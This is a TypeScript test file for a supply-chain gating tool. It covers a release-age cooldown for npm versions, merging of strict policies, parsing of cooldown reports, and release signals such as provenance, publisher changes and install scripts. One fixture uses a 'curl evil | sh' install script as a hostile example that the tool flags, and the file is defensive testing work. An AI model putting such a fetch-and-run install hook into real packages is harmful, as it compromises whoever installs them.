import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import { main } from "../src/cli.ts";
import { DEFAULT_CONFIG, isOwnPackage, type OwnPackages } from "../src/config.ts";
import { cooldownOf, heldUntil, strictestPolicy } from "../src/cooldown.ts";
import { releaseSignals } from "../src/npm-registry.ts";
import type { PackageName } from "../src/package-version.ts";
import type { HeldVersion } from "../src/release-age.ts";
import { runCompare } from "../src/gate.ts";
import { REPORT_SCHEMA_VERSION } from "../src/report.ts";
import { environment, files, json, tree } from "./required-fixture.ts";

const HEAD = "a".repeat(40);
const held: HeldVersion = {
  ecosystem: "npm", name: "vite", version: "8.3.3", replaced: ["8.3.2"],
  published: "2026-10-06T00:00:00.000Z", eligibleAt: "2026-10-13T00:00:00.000Z", justification: "security-fix",
};
const report = (cooldown: unknown, overrides: Record<string, unknown> = {}) => ({
  schemaVersion: REPORT_SCHEMA_VERSION, mode: "compare", headSha: HEAD, completed: true, verdict: "pass", cooldown, ...overrides,
});

describe("the cooldown in a comparison", () => {
  it("holds the young security fix and the young version it requires, though both pass the verdict", async () => {
    const outcome = await runCompare(tree(files()), tree(files("8.3.3", "8.5.29"), "head"), environment().env);
    expect(outcome.failures).toEqual([]);
    expect(outcome.cooldown).toEqual({
      evaluated: true,
      releaseAgeDays: 7,
      held: [
        { ...held, published: "2026-10-06T00:00:00.000Z" },
        { ecosystem: "npm", name: "postcss", version: "8.5.29", replaced: ["8.5.28"], published: "2026-10-06T00:00:00.000Z", eligibleAt: "2026-10-13T00:00:00.000Z", justification: "required" },
      ],
    });
  });

  it("holds nothing when no version changes", async () => {
    const outcome = await runCompare(tree(files()), tree(files(), "head"), environment().env);
    expect(outcome.cooldown).toEqual({ evaluated: true, releaseAgeDays: 7, held: [] });
  });

  it("isn't loosened by a head config that shortens the wait", async () => {
    const head = { ...files("8.3.3", "8.5.29"), ".github/supply-chain.json": json({ releaseAgeDays: 1 }) };
    const outcome = await runCompare(tree(files()), tree(head, "head"), environment().env);
    expect(outcome.cooldown.evaluated && outcome.cooldown.held.map((entry) => `${entry.name}@${entry.version}`)).toEqual(["vite@8.3.3", "postcss@8.5.29"]);
  });

  it("isn't evaluated when base's settings don't parse", async () => {
    const base = { ...files(), ".github/supply-chain.json": "{" };
    const outcome = await runCompare(tree(base), tree(files("8.3.3", "8.5.29"), "head"), environment().env);
    expect(outcome.cooldown).toMatchObject({ evaluated: false });
  });
});

describe("strictestPolicy", () => {
  const own = (overrides: Partial<OwnPackages>): OwnPackages => ({ ...DEFAULT_CONFIG.ownPackages, ...overrides });
  const policy = strictestPolicy(
    { ...DEFAULT_CONFIG, releaseAgeDays: 3, ownPackages: own({ npmScopes: ["@leanish", "@added"], actionOwners: ["Leanish"], pluginIdPrefixes: ["com.acme.tools."] }) },
    { ...DEFAULT_CONFIG, releaseAgeDays: 10, ownPackages: own({ npmScopes: ["@leanish"], actionOwners: ["leanish"], pluginIdPrefixes: ["com.acme."] }) },
  );
  const isOwn = (pkg: PackageName) => isOwnPackage(policy.ownPackages, pkg);

  it("takes the longer wait", () => {
    expect(policy.releaseAgeDays).toBe(10);
  });

  it("owns a package only where both sides own it, however each side spells it", () => {
    expect(isOwn({ ecosystem: "npm", name: "@leanish/tool" })).toBe(true);
    expect(isOwn({ ecosystem: "npm", name: "@added/tool" })).toBe(false);
    expect(isOwn({ ecosystem: "GitHub Actions", name: "leanish/supply-chain" })).toBe(true);
    // Overlapping prefixes: both sides own this plugin marker, though neither lists the other's prefix.
    expect(isOwn({ ecosystem: "Maven", name: "com.acme.tools.check:com.acme.tools.check.gradle.plugin" })).toBe(true);
    expect(isOwn({ ecosystem: "Maven", name: "com.acme.other:com.acme.other.gradle.plugin" })).toBe(false);
  });
});

describe("cooldownOf", () => {
  it("reads the held versions of a passing comparison of this head", () => {
    expect(cooldownOf(report({ evaluated: true, releaseAgeDays: 7, held: [held] }), HEAD)).toEqual({ releaseAgeDays: 7, held: [held] });
    expect(heldUntil([held, { ...held, eligibleAt: "2026-10-14T00:00:00.000Z" }])).toBe("2026-10-14T00:00:00.000Z");
    expect(heldUntil([])).toBeUndefined();
  });

  it.each([
    ["another head", report({ evaluated: true, releaseAgeDays: 7, held: [] }, { headSha: "b".repeat(40) }), "not"],
    ["an older schema", report({ evaluated: true, releaseAgeDays: 7, held: [] }, { schemaVersion: 1 }), "schemaVersion"],
    ["a failing comparison", report({ evaluated: true, releaseAgeDays: 7, held: [] }, { verdict: "fail" }), "pass"],
    ["no cooldown", report(undefined), "no cooldown"],
    ["an unevaluated cooldown", report({ evaluated: false, reason: "base broke" }), "base broke"],
    ["no held list", report({ evaluated: true, releaseAgeDays: 7 }), "held list"],
    ["a malformed entry", report({ evaluated: true, releaseAgeDays: 7, held: [{ ...held, eligibleAt: "soon" }] }), "ISO instant"],
    ["an unknown justification", report({ evaluated: true, releaseAgeDays: 7, held: [{ ...held, justification: "trusted" }] }), "justification"],
  ])("refuses %s", (_name, raw, message) => {
    expect(() => cooldownOf(raw, HEAD)).toThrow(message);
  });
});

describe("supply-chain cooldown", () => {
  async function run(content: unknown) {
    const dir = await mkdtemp(join(tmpdir(), "cooldown-"));
    const reportPath = join(dir, "report.json");
    const output = join(dir, "output");
    if (content !== undefined) await writeFile(reportPath, JSON.stringify(content));
    const code = await main(["cooldown", "--report", reportPath, "--head", HEAD], { GITHUB_OUTPUT: output });
    return { code, output: await readFile(output, "utf8").catch(() => undefined) };
  }

  it("evaluates a held comparison: exit 0, held=true and when it ends", async () => {
    expect(await run(report({ evaluated: true, releaseAgeDays: 7, held: [held] }))).toEqual({ code: 0, output: "held=true\nuntil=2026-10-13T00:00:00.000Z\n" });
  });

  it("evaluates a comparison holding nothing", async () => {
    expect(await run(report({ evaluated: true, releaseAgeDays: 7, held: [] }))).toEqual({ code: 0, output: "held=false\nuntil=\n" });
  });

  it("fails without writing an output when the report is missing or can't be trusted", async () => {
    expect(await run(undefined)).toEqual({ code: 2, output: undefined });
    expect(await run(report(undefined))).toEqual({ code: 2, output: undefined });
  });
});

describe("releaseSignals", () => {
  const manifest = (user: string, extra: Record<string, unknown> = {}) => ({ _npmUser: { name: user }, dist: {}, ...extra });
  const attested = { dist: { attestations: { url: "https://registry.npmjs.org/-/npm/v1/attestations/lib@1.0.1", provenance: { predicateType: "https://slsa.dev/provenance/v1" } } } };

  it("says what changed against the replaced version", () => {
    const doc = { times: {}, versions: { "1.0.0": manifest("alice"), "1.0.1": { ...manifest("mallory", { scripts: { postinstall: "node x.js", test: "t" } }), ...attested } } };
    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])).toEqual(["has provenance", "publisher changed: mallory (before: alice)", "adds or changes install scripts: postinstall"]);
  });

  it("says when nothing changed, or when there's nothing to compare with", () => {
    const doc = { times: {}, versions: { "1.0.0": manifest("alice", { scripts: { install: "x" } }), "1.0.1": manifest("alice", { scripts: { install: "x" } }) } };
    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])).toEqual(["no provenance", "published by alice, as before", "install scripts as before: install"]);
    expect(releaseSignals(doc, "lib", "1.0.1", [])).toEqual(["no provenance", "published by alice", "install scripts: install"]);
  });

  it("counts a changed install command as a change", () => {
    const doc = { times: {}, versions: { "1.0.0": manifest("alice", { scripts: { install: "node a.js" } }), "1.0.1": manifest("alice", { scripts: { install: "curl evil | sh" } }) } };
    expect(releaseSignals(doc, "lib", "1.0.1", ["1.0.0"])[2]).toBe("adds or changes install scripts: install");
  });

  it("calls what it can't read unknown", () => {
    expect(releaseSignals({ times: {}, versions: {} }, "lib", "1.0.1", ["1.0.0"])).toEqual(["provenance unknown", "publisher unknown", "install scripts unknown"]);
  });
});
